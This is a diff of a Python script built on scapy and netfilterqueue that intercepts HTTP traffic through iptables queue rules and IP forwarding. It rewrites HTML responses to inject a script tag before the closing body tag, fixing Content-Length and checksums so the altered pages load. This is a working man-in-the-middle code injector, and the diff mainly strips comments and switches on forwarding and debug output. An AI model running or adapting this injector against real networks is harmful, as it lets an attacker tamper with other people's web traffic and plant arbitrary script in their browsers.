@@ -8,7 +8,6 @@ import re
 
 def set_load(packet, load):
     print("[+] Replacing file")
-    #example for location of desired site
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
@@ -40,10 +39,8 @@ def queue_packet(packet):
             elif scapy_packet[scapy.TCP].sport == 80:
                 print("\n[+] Response")
                 modified_load = scapy_packet[scapy.Raw].load
-                #print("\n--------------------------------------------")
-                #set your location you want make changes to
+                print("\n--------------------------------------------")
                 from_str = b"</body>"
-                #set your changes
                 to_str = b"<script>alert('Warning Hacked');</script></body>"
                 modified_load = modified_load.replace(from_str, to_str)
                 injection_code = "<script>alert('Warning Hacked');</script>"
@@ -54,25 +51,21 @@ def queue_packet(packet):
                 if content_length and b"text/html" in modified_load:
                     new_len = len(injection_code) + int(content_length[1])
                     new_len = str(new_len).encode()
-                    #print(modified_load)
                     content_length = str(content_length[1]).encode()
                     print(content_length)
-                    #print(new_len)
                     modified_load = modified_load.replace(
                         content_length, new_len)
-                    #print(modified_load)
                 temp_packet = set_load(scapy_packet, modified_load)
-                #print(temp_packet[scapy.Raw].load)
                 temp_packet.show()
                 packet.set_payload(bytes(temp_packet))
-                #print(packet.haslayer(scapy.Raw).load)'''
+                print(packet.haslayer(scapy.Raw).load)
     packet.accept()
 
 
 try:
     subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
     subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
-    #subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, queue_packet)
     queue.run()
